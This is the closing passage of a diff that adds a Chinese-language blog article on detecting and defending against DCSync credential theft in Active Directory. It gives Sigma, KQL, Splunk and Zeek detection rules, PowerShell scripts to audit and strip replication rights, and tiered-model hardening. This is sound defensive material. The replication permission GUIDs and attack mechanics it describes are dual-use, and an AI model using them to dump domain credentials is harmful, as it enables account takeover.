+<span class="w">    </span><span class="mi">1</span><span class="p">=</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;CRITICAL (Unexpected User)&quot;</span>
+<span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">table</span><span class="w"> </span><span class="nx">_time</span><span class="p">,</span><span class="w"> </span><span class="nx">SubjectUserName</span><span class="p">,</span><span class="w"> </span><span class="nx">SubjectDomainName</span><span class="p">,</span><span class="w"> </span><span class="nx">Computer</span><span class="p">,</span><span class="w"> </span><span class="nx">Properties</span><span class="p">,</span><span class="w"> </span><span class="nx">risk</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">sort</span><span class="w"> </span><span class="o">-</span><span class="nx">_time</span>
+</code></pre></div>
+
+<p><strong>Elastic KQL / Lucene 检测规则</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="n">event</span><span class="err">.</span><span class="n">code</span><span class="p">:</span><span class="mi">4662</span><span class="w"> </span>
+<span class="n">AND</span><span class="w"> </span><span class="n">winlog</span><span class="err">.</span><span class="n">event_data</span><span class="err">.</span><span class="n">Properties</span><span class="p">:(</span>
+<span class="w">  </span><span class="s">&quot;1131f6aa-9c07-11d1-f79f-00c04fc2dab2&quot;</span><span class="w"> </span>
+<span class="w">  </span><span class="n">OR</span><span class="w"> </span><span class="s">&quot;1131f6ad-9c07-11d1-f79f-00c04fc2dab2&quot;</span>
+<span class="p">)</span>
+<span class="n">AND</span><span class="w"> </span><span class="n">NOT</span><span class="w"> </span><span class="n">user</span><span class="err">.</span><span class="n">name</span><span class="p">:(*</span><span class="err">$</span><span class="w"> </span><span class="n">OR</span><span class="w"> </span><span class="n">DC</span><span class="p">*)</span>
+</code></pre></div>
+
+<p><strong>Sigma 规则</strong>（可导入 Splunk/ELK/QRadar）：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">DCSync Attack Detection via Event 4662</span>
+<span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">611eab06-a145-4dfa-a295-3a5bfc406e31</span>
+<span class="nt">status</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">stable</span>
+<span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Detects DCSync replication from non-DC accounts</span>
+<span class="nt">logsource</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">product</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">windows</span>
+<span class="w">    </span><span class="nt">service</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">security</span>
+<span class="nt">detection</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">selection</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">EventID</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">4662</span>
+<span class="w">        </span><span class="nt">Properties|contains</span><span class="p">:</span>
+<span class="w">            </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;1131f6aa-9c07-11d1-f79f-00c04fc2dab2&#39;</span>
+<span class="w">            </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;1131f6ad-9c07-11d1-f79f-00c04fc2dab2&#39;</span>
+<span class="w">    </span><span class="nt">filter_dc</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">SubjectUserName|endswith</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;$&#39;</span><span class="w">   </span><span class="c1"># 机器账户 = DC</span>
+<span class="w">    </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">selection AND NOT filter_dc</span>
+<span class="nt">falsepositives</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Legitimate AD Connect sync</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Exchange replication</span>
+<span class="nt">level</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">high</span>
+<span class="nt">tags</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">attack.credential_access</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">attack.t1003.006</span>
+</code></pre></div>
+
+<h3>6.2 非 DC 主机的 DRSUAPI 调用检测</h3>
+<p>更底层的检测在网络层——监控非 DC IP 地址发起的 DRSUAPI RPC 调用。</p>
+<p><strong>Zeek (Bro) 网络检测脚本</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c"># detect_dcsync.zeek</span>
+<span class="c"># 检测非DC主机到DC的DRSUAPI RPC绑定</span>
+
+<span class="kd">global</span><span class="w"> </span><span class="n">dc_addresses</span><span class="p">:</span><span class="w"> </span><span class="kt">set</span><span class="p">[</span><span class="kt">addr</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="m">192.168.1.10</span><span class="p">,</span><span class="w"> </span><span class="m">192.168.1.11</span><span class="w">  </span><span class="c"># 已知 DC IP 列表</span>
+<span class="p">};</span>
+
+<span class="kt">event</span><span class="w"> </span><span class="nf">dce_rpc_message</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="w"> </span><span class="n">connection</span><span class="p">,</span><span class="w"> </span><span class="n">opnum</span><span class="p">:</span><span class="w"> </span><span class="kt">count</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                      </span><span class="n">hdr</span><span class="p">:</span><span class="w"> </span><span class="n">dce_rpc_hdr</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="p">:</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c"># DRSUAPI 接口 UUID: E3514235-4B06-11D1-AB04-00C04FC2DCD2</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="o">$</span><span class="n">current</span><span class="o">?$</span><span class="n">endpoint</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>
+<span class="w">        </span><span class="n">c</span><span class="o">$</span><span class="n">current</span><span class="o">$</span><span class="n">endpoint</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;e3514235-4b06-11d1-ab04-00c04fc2dcd2&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="c"># IDL_DRSGetNCChanges = opnum 3</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">opnum</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">3</span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="o">$</span><span class="n">id</span><span class="o">$</span><span class="n">orig_h</span><span class="w"> </span><span class="o">!</span><span class="ow">in</span><span class="w"> </span><span class="n">dc_addresses</span><span class="p">)</span>
+<span class="w">            </span><span class="p">{</span>
+<span class="w">                </span><span class="nf">NOTICE</span><span class="p">([</span><span class="o">$</span><span class="n">note</span><span class="o">=</span><span class="n">DCSync_Attempt</span><span class="p">,</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">msg</span><span class="o">=</span><span class="nf">fmt</span><span class="p">(</span><span class="s">&quot;Non-DC host </span><span class="se">%s</span><span class="s"> called DRSGetNCChanges&quot;</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                             </span><span class="n">c</span><span class="o">$</span><span class="n">id</span><span class="o">$</span><span class="n">orig_h</span><span class="p">),</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">sub</span><span class="o">=</span><span class="nf">fmt</span><span class="p">(</span><span class="s">&quot;Target: </span><span class="se">%s</span><span class="s">, User may have DCSync rights&quot;</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                             </span><span class="n">c</span><span class="o">$</span><span class="n">id</span><span class="o">$</span><span class="n">resp_h</span><span class="p">),</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">conn</span><span class="o">=</span><span class="n">c</span><span class="p">,</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">identifier</span><span class="o">=</span><span class="nf">cat</span><span class="p">(</span><span class="n">c</span><span class="o">$</span><span class="n">id</span><span class="o">$</span><span class="n">orig_h</span><span class="p">,</span><span class="w"> </span><span class="n">c</span><span class="o">$</span><span class="n">id</span><span class="o">$</span><span class="n">resp_h</span><span class="p">)</span>
+<span class="w">                </span><span class="p">]);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><strong>Windows Defender for Identity (MDI) 检测</strong>：</p>
+<p>MDI 内置 DCSync 检测，其逻辑为：
+1. 监控所有 DRSUAPI RPC 调用（通过域控上的网络捕获）；
+2. 识别调用方账户类型（机器账户 vs 用户账户）；
+3. 用户账户调用 <code>IDL_DRSGetNCChanges</code> 且目标为复制操作 → 触发告警。</p>
+<p>MDI 告警示例：</p>
+<div class="highlight"><pre><span></span><code>Suspicious replication request (potential DCSync attack)
+Account: CORP\svc_backup
+Source: 192.168.1.50 (非DC主机)
+Target DC: DC01
+Action: Replication of directory changes (GetNCChanges)
+</code></pre></div>
+
+<h3>6.3 DCSync 权限最小化方案</h3>
+<p>防御 DCSync 的根本是<strong>收窄复制权限</strong>。以下是权限审计与最小化步骤：</p>
+<p><strong>步骤1：审计当前权限持有者</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c"># 审计域 NC 根上的复制权限</span>
+<span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span>
+
+<span class="nv">$domainDN</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ADDomain</span><span class="p">).</span><span class="n">DistinguishedName</span>
+<span class="nv">$acl</span> <span class="p">=</span> <span class="nb">Get-Acl</span> <span class="s2">&quot;AD:\$domainDN&quot;</span>
+
+<span class="c"># 查找 GetChanges 和 GetChangesAll 权限</span>
+<span class="nv">$replicationGUIDs</span> <span class="p">=</span> <span class="p">@{</span>
+    <span class="s2">&quot;1131f6aa-9c07-11d1-f79f-00c04fc2dab2&quot;</span> <span class="p">=</span> <span class="s2">&quot;GetChanges&quot;</span>
+    <span class="s2">&quot;1131f6ad-9c07-11d1-f79f-00c04fc2dab2&quot;</span> <span class="p">=</span> <span class="s2">&quot;GetChangesAll&quot;</span>
+    <span class="s2">&quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;</span> <span class="p">=</span> <span class="s2">&quot;GetChangesInFilteredSet&quot;</span>
+<span class="p">}</span>
+
+<span class="nv">$acl</span><span class="p">.</span><span class="n">Access</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span>
+    <span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-match</span> <span class="s2">&quot;ExtendedRight&quot;</span> <span class="o">-and</span>
+    <span class="nv">$_</span><span class="p">.</span><span class="n">ObjectType</span> <span class="n">-in</span> <span class="nv">$replicationGUIDs</span><span class="p">.</span><span class="n">Keys</span>
+<span class="p">}</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span>
+    <span class="no">[PSCustomObject]</span><span class="p">@{</span>
+        <span class="n">Identity</span>    <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span>
+        <span class="n">Permission</span>  <span class="p">=</span> <span class="nv">$replicationGUIDs</span><span class="p">[</span><span class="nv">$_</span><span class="p">.</span><span class="n">ObjectType</span><span class="p">]</span>
+        <span class="nb">Type </span>       <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="n">AccessControlType</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-AutoSize</span>
+</code></pre></div>
+
+<p><strong>步骤2：移除非必要权限</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c"># 移除 Exchange 组的 GetChangesAll (如果不再使用 Exchange 内部复制)</span>
+<span class="nv">$domainDN</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ADDomain</span><span class="p">).</span><span class="n">DistinguishedName</span>
+<span class="nv">$acl</span> <span class="p">=</span> <span class="nb">Get-Acl</span> <span class="s2">&quot;AD:\$domainDN&quot;</span>
+
+<span class="c"># 移除 &quot;Exchange Windows Permissions&quot; 组的复制权限</span>
+<span class="nv">$exchangeGroup</span> <span class="p">=</span> <span class="s2">&quot;CORP\Exchange Windows Permissions&quot;</span>
+<span class="nv">$guid</span> <span class="p">=</span> <span class="no">[Guid]</span><span class="s2">&quot;1131f6ad-9c07-11d1-f79f-00c04fc2dab2&quot;</span>
+
+<span class="nv">$acesToRemove</span> <span class="p">=</span> <span class="nv">$acl</span><span class="p">.</span><span class="n">Access</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span>
+    <span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-eq</span> <span class="nv">$exchangeGroup</span> <span class="o">-and</span>
+    <span class="nv">$_</span><span class="p">.</span><span class="n">ObjectType</span> <span class="o">-eq</span> <span class="nv">$guid</span>
+<span class="p">}</span>
+
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$ace</span> <span class="k">in</span> <span class="nv">$acesToRemove</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$acl</span><span class="p">.</span><span class="n">RemoveAccessRuleSpecific</span><span class="p">(</span><span class="nv">$ace</span><span class="p">)</span>
+    <span class="nb">Write-Host</span> <span class="s2">&quot;移除: </span><span class="p">$(</span><span class="nv">$ace</span><span class="p">.</span><span class="n">IdentityReference</span><span class="p">)</span><span class="s2"> 的复制权限&quot;</span>
+<span class="p">}</span>
+
+<span class="nb">Set-Acl</span> <span class="n">-Path</span> <span class="s2">&quot;AD:\$domainDN&quot;</span> <span class="n">-AclObject</span> <span class="nv">$acl</span>
+</code></pre></div>
+
+<p><strong>步骤3：监控权限变更</strong></p>
+<p>对域 NC 根的 ACL 修改设置审计：</p>
+<div class="highlight"><pre><span></span><code><span class="c"># 启用对域 NC 根 ACL 修改的审计</span>
+<span class="n">auditpol</span> <span class="p">/</span><span class="nb">set </span><span class="p">/</span><span class="n">subcategory</span><span class="p">:</span><span class="s2">&quot;Directory Service Access&quot;</span> <span class="p">/</span><span class="n">success</span><span class="p">:</span><span class="n">enable</span>
+</code></pre></div>
+
+<h3>6.4 AD Tiered Model 分层防御架构</h3>
+<p>AD Tiered Model（分层管理模型）是微软推荐的 AD 安全架构，核心思想是<strong>管理权限隔离</strong>，防止高权限凭据流入低安全层。</p>
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────────────────┐
+│<span class="w">                    </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">0</span>:<span class="w"> </span>域控制器层<span class="w">                              </span>│
+│<span class="w">   </span>┌─────────────────────────────────────────────────────────┐<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span>域控、<span class="nv">AD</span><span class="w"> </span><span class="nv">DS</span>、<span class="nv">AD</span><span class="w"> </span><span class="nv">CS</span><span class="w"> </span><span class="ss">(</span><span class="nv">Enterprise</span><span class="w"> </span><span class="nv">CA</span><span class="ss">)</span>、<span class="nv">Hyper</span><span class="o">-</span><span class="nv">V</span><span class="w"> </span>宿主<span class="ss">(</span>承载<span class="nv">DC</span><span class="ss">)</span><span class="w"> </span>│<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span>权限:<span class="w"> </span><span class="nv">Domain</span><span class="w"> </span><span class="nv">Admins</span>,<span class="w"> </span><span class="nv">Enterprise</span><span class="w"> </span><span class="nv">Admins</span>,<span class="w"> </span><span class="nv">DC</span><span class="w"> </span>本地<span class="w"> </span><span class="nv">Admin</span><span class="w">   </span>│<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span>规则:<span class="w"> </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span>账户永远不能登录<span class="w"> </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">1</span><span class="o">/</span><span class="mi">2</span><span class="w"> </span>主机<span class="w">              </span>│<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span>防护:<span class="w"> </span><span class="nv">PAW</span><span class="w"> </span><span class="ss">(</span><span class="nv">Privileged</span><span class="w"> </span><span class="nv">Access</span><span class="w"> </span><span class="nv">Workstation</span><span class="ss">)</span><span class="w"> </span>专属管理机<span class="w">     </span>│<span class="w">    </span>│
+│<span class="w">   </span>└─────────────────────────────────────────────────────────┘<span class="w">    </span>│
+│<span class="w">                         </span>↕<span class="w"> </span><span class="ss">(</span>仅允许受控通道<span class="ss">)</span><span class="w">                         </span>│
+├──────────────────────────────────────────────────────────────────┤
+│<span class="w">                    </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">1</span>:<span class="w"> </span>服务器层<span class="w">                                </span>│
+│<span class="w">   </span>┌─────────────────────────────────────────────────────────┐<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span><span class="nv">Exchange</span>、<span class="nv">SQL</span>、<span class="nv">SharePoint</span>、文件服务器、<span class="nv">AD</span><span class="w"> </span><span class="k">Connect</span><span class="w">        </span>│<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span>权限:<span class="w"> </span><span class="nv">Server</span><span class="w"> </span><span class="nv">Admins</span><span class="w"> </span><span class="ss">(</span>仅管理本层服务器<span class="ss">)</span><span class="w">                   </span>│<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span>规则:<span class="w"> </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span>账户不能登录<span class="w"> </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span>主机<span class="w"> </span><span class="ss">(</span>防凭据窃取→<span class="nv">DCSync</span><span class="ss">)</span><span class="w"> </span>│<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">       </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span>账户不能登录<span class="w"> </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span>工作站<span class="w">                   </span>│<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span>关键:<span class="w"> </span><span class="nv">Exchange</span><span class="o">/</span><span class="nv">AD</span><span class="w"> </span><span class="k">Connect</span><span class="w"> </span>账户隔离在此层<span class="w">                  </span>│<span class="w">    </span>│
+│<span class="w">   </span>└─────────────────────────────────────────────────────────┘<span class="w">    </span>│
+│<span class="w">                         </span>↕<span class="w">                                         </span>│
+├──────────────────────────────────────────────────────────────────┤
+│<span class="w">                    </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">2</span>:<span class="w"> </span>用户<span class="o">/</span>工作站层<span class="w">                           </span>│
+│<span class="w">   </span>┌─────────────────────────────────────────────────────────┐<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span>用户工作站、普通员工账户<span class="w">                                  </span>│<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span>权限:<span class="w"> </span>普通用户,<span class="w"> </span>仅管理自己的工作站<span class="w">                        </span>│<span class="w">    </span>│
+│<span class="w">   </span>│<span class="w">  </span>规则:<span class="w"> </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span>账户不能登录<span class="w"> </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">0</span><span class="o">/</span><span class="mi">1</span><span class="w"> </span>主机<span class="w">                  </span>│<span class="w">    </span>│
+│<span class="w">   </span>└─────────────────────────────────────────────────────────┘<span class="w">    </span>│
+└──────────────────────────────────────────────────────────────────┘
+
+<span class="w">    </span>分层核心原则:
+<span class="w">    </span><span class="mi">1</span>.<span class="w"> </span>凭据单向流动:<span class="w"> </span>高层凭据永远不进入低层主机<span class="w"> </span><span class="ss">(</span>防<span class="w"> </span><span class="nv">Mimikatz</span><span class="o">/</span><span class="nv">LSASS</span><span class="w"> </span>提取<span class="ss">)</span>
+<span class="w">    </span><span class="mi">2</span>.<span class="w"> </span>管理通道隔离:<span class="w"> </span>每层使用独立的管理账户和<span class="w"> </span><span class="nv">PAW</span>
+<span class="w">    </span><span class="mi">3</span>.<span class="w"> </span><span class="nv">DCSync</span><span class="w"> </span>防护:<span class="w"> </span>即使<span class="w"> </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="ss">(</span><span class="nv">Exchange</span><span class="ss">)</span><span class="w"> </span>被攻破,
+<span class="w">       </span>由于凭据隔离,<span class="w"> </span>攻击者无法横向到<span class="w"> </span><span class="nv">Tier</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span>执行<span class="w"> </span><span class="nv">DCSync</span>
+</code></pre></div>
+
+<p>分层模型对 DCSync 的防御逻辑：</p>
+<ol>
+<li><strong>Tier 0 凭据隔离</strong>：Domain Admins 账户只通过 PAW 登录 Tier 0 主机，从不登录 Tier 1/2。即使 Tier 2 工作站被钓鱼攻破，攻击者也只能拿到 Tier 2 凭据，无法触及 DCSync 权限。</li>
+<li><strong>Tier 1 服务账户治理</strong>：Exchange / AD Connect 账户被严格限制在 Tier 1。即使这些账户拥有 DCSync 权限，攻击者要获取其凭据，必须先攻破 Tier 1 服务器——这显著提高了攻击成本。</li>
+<li><strong>特权访问管理 (PAM)</strong>：对于必须跨层的管理操作，使用 Just-in-Time (JIT) 临时授权，而非永久权限。DCSync 权限不应常驻于任何服务账户。</li>
+</ol>
+<p><strong>实施关键配置</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c"># 通过 GPO 限制登录权限, 实现分层</span>
+<span class="c"># Tier 0 账户禁止登录 Tier 1/2</span>
+<span class="nv">$gpo</span> <span class="p">=</span> <span class="nb">New-GPO</span> <span class="n">-Name</span> <span class="s2">&quot;Tier0_LogonRestriction&quot;</span>
+<span class="nb">Set-GPRegistryValue</span> <span class="n">-Name</span> <span class="s2">&quot;Tier0_LogonRestriction&quot;</span> <span class="p">`</span>
+    <span class="n">-Key</span> <span class="s2">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\GroupPolicy&quot;</span> <span class="p">`</span>
+    <span class="n">-ValueName</span> <span class="s2">&quot;DenyLogonLocally&quot;</span> <span class="p">`</span>
+    <span class="n">-Type</span> <span class="n">String</span> <span class="p">`</span>
+    <span class="n">-Value</span> <span class="s2">&quot;CORP\ServerAdmins;CORP\DomainUsers&quot;</span>
+
+<span class="c"># 通过 Authentication Silos 强制账户分层</span>
+<span class="c"># 将 Tier 0 账户放入专属 silo, 禁止认证到低层主机</span>
+<span class="nb">New-ADAuthenticationPolicy</span> <span class="n">-Name</span> <span class="s2">&quot;Tier0_AuthPolicy&quot;</span> <span class="p">`</span>
+    <span class="n">-UserAllowedToAuthenticateFrom</span> <span class="s2">&quot;O:BAD:(A;;CR;;;S-1-5-21-xxx-516)&quot;</span> <span class="p">`</span>
+    <span class="c"># 516 = Domain Controllers 组, 仅允许认证到 DC</span>
+
+<span class="nb">New-ADAuthenticationPolicySilo</span> <span class="n">-Name</span> <span class="s2">&quot;Tier0_Silo&quot;</span> <span class="p">`</span>
+    <span class="n">-Enforced</span> <span class="nv">$true</span> <span class="p">`</span>
+    <span class="n">-UserAuthenticationPolicy</span> <span class="s2">&quot;Tier0_AuthPolicy&quot;</span>
+</code></pre></div>
+
+<hr />
+<h2>7. 总结</h2>
+<p>DCSync 攻击之所以危险，是因为它击中了 AD 安全模型的两个根本假设：</p>
+<ol>
+<li><strong>"保护域控就保护了凭据"</strong>——DCSync 证明了凭据可以通过协议合法流出域控，不需要在域控上执行代码。</li>
+<li><strong>"复制权限等同于域管"</strong>——大量服务账户（Exchange、AD Connect）拥有复制权限，这些账户的防护强度远低于域管账户。</li>
+</ol>
+<p>防御 DCSync 的关键不在于单点检测，而在于<strong>系统性治理</strong>：</p>
+<ul>
+<li><strong>权限最小化</strong>：审计并收窄复制权限，移除非必要的 <code>GetChangesAll</code> 授予；</li>
+<li><strong>分层隔离</strong>：实施 AD Tiered Model，确保高权限凭据不流入低安全层；</li>
+<li><strong>检测纵深</strong>：结合 Event 4662、网络层 DRSUAPI 监控、MDI 行为分析，构建多层检测；</li>
+<li><strong>凭据轮换</strong>：定期轮换 krbtgt 密码（至少每年一次），缩短黄金票据的有效窗口。</li>
+</ul>
+<p>理解 DCSync 的协议本质——MS-DRSR 的权限即身份模型——是构建有效防御的前提。防御者必须认识到：在 AD 中，<strong>拥有复制权限的每一个账户，都是事实上的域控</strong>。</p>
+<hr />
+<h2>免责声明</h2>
+<p>本文仅供安全研究和技术学习使用，文中涉及的漏洞分析、PoC代码和攻击技术仅用于授权测试和安全防御建设。读者应遵守所在地区的法律法规，未经授权不得对任何系统进行渗透测试或攻击。因不当使用本文内容所造成的任何后果，作者不承担任何责任。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
